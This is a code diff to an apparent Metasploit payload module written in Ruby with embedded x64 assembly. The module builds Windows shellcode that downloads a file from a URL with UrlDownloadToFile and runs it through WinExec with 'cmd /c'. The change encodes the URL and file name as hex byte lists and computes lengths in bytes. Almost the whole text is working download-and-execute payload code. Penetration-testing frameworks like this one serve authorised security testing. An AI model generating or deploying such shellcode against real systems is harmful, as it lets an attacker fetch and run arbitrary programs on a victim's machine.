@@ -40,6 +40,10 @@ module MetasploitModule
     url = datastore['URL'] || 'http://localhost/hi.exe'
     file = datastore['FILEPATH'] || 'fox.exe'
     display = datastore['DISPLAY'] || 'HIDE'
+    url_length = url.bytesize
+    file_length = file.bytesize
+    url = url.bytes.map { |byte| '0x%02x' % byte }.join(', ')
+    file = file.bytes.map { |byte| '0x%02x' % byte }.join(', ')
 
     payload = %^
             cld
@@ -61,17 +65,17 @@ module MetasploitModule
 
         SetUrl:
             call SetFile
-            db "#{url}A"
+            db #{url}, 0x41
 
         SetFile:
             pop rdx ; 2nd argument
-            xor byte [rdx+#{url.length}], 'A' ; null terminator
+            xor byte [rdx+#{url_length}], 'A' ; null terminator
             call UrlDownloadToFile
-            db "#{file}C"
+            db #{file}, 0x43
 
         UrlDownloadToFile:
             pop r8 ; 3rd argument
-            xor byte [r8+#{file.length}], 'C' ; null terminator
+            xor byte [r8+#{file_length}], 'C' ; null terminator
             xor rcx,rcx ; 1st argument
             xor r9,r9   ; 4th argument
             sub rsp, 8
@@ -81,11 +85,11 @@ module MetasploitModule
 
         SetCommand:
             call Exec
-            db "cmd /c #{file}F"
+            db "cmd /c ", #{file}, 0x46
 
         Exec:
             pop rcx ; 1st argument
-            xor byte [rcx+#{file.length + 7}], 'F' ; null terminator
+            xor byte [rcx+#{file_length + 7}], 'F' ; null terminator
             mov r10d, #{block_api_hash('kernel32.dll', 'WinExec')}
             xor rdx, rdx ; 2nd argument
         ^
